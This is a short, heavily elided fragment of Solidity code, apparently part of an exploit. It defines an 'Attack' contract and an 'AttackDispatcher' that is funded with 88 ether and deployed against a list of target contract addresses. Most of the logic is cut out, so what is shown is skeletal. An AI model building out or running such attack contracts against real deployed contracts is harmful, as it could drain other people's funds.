 ...
 * parameter. Make sure to send at least 88 ether and 1 wei to the attack
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 0) {
                ...
                uint value = 0x4c53ecdc18a600000;
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x4c53ecdc18a600001; /* equals 88 ether and 1 wei */
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate_state = 0;
        rstate[0] = 0;
        subs[0] = new AttackDispatcher{value: 88000000000000000000 }(0, _targets);
    }
